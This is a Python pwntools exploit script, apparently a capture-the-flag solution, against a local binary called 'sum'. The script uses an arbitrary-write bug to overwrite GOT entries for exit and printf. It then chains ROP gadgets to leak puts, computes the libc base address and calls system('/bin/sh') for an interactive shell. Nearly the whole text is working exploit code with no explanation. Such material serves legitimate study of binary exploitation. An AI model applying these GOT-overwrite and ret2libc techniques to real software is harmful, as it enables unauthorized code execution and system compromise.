from pwn import * 


context(terminal=['tmux','new-window'])
p = process("./sum",env={"LD_PRELOAD":"./libc.so"})
#p= gdb.debug("./sum","b * 0x4009bf")

binary = ELF("sum")
libc = ELF("libc.so")


main = binary.symbols['main']
exit = binary.got['exit']
puts_plt = binary.plt['puts']
puts_got = binary.got['puts']
printf_got = binary.got['printf']
call_exit = 0x400847
#gadget 
pop_rdi = 0x400a43 # pop rdi; ret;
ret = 0x4005ee # ret;

def write(addr,value):
  p.sendline("%d %d %d %d %d %d " % (-1,-1,2,-addr, value, addr)) 
  p.recv()


write(exit,main)  #overwrite exit with main
write(printf_got,pop_rdi) #overwrite printf with pop_rdi

p.sendline("%d %d %d %d %d" % (pop_rdi,puts_got,puts_plt,call_exit,0)) #when send 0, call printf 


recieved = p.recvline().strip("\n")
leak_addr = u64(recieved.ljust(8,'\x00'))

base_libc = leak_addr - libc.symbols['puts']

log.success("Leak Libc Puts: "+hex(leak_addr))
log.success("Base Libc: "+hex(base_libc))


######system(/bin/sh)##########
system_libc = libc.symbols['system'] + base_libc
bin_sh_libc = base_libc + 0x1b3e9a                    #1b3e9a /bin/sh


p.sendline("%d %d %d %d" % (pop_rdi,bin_sh_libc,system_libc,0))
p.interactive()
